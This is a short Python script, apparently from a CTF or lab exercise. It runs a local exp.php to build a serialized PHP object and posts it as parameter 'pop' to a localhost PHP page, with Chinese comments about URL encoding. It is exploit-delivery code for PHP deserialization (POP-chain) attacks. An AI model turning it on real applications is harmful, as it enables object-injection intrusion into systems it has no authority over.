# 注意 requests.get 如果使用params传参，会自动添加一层url编码。。。
# 如果php已经urlencode了，手动解码再发，或者不要使用params
import os
from urllib.parse import unquote
import subprocess
from requests_html import HTMLSession
import re
from pathlib import Path

url = 'http://localhost/1.php'
key = 'pop'
php = r'D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe'

print(__file__)
parent = Path(__file__).parent
exp = (parent / 'exp.php').absolute()

s = HTMLSession()
output = subprocess.getoutput(f'{php} -f {exp}')

ser = re.search(r'O:.*', output).group()

data = {key: ser}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
proxies = {}
headers = {
    'cookie': 'XDEBUG_SESSION=XDEBUG_ECLIPSE;',
}




def get():
    res = s.post(url, headers=headers, params=data, proxies=proxies)
    return res.text


def post():
    res = s.post(url, headers=headers, data=data, proxies=proxies)
    return res.text


# print(get())
print(post())
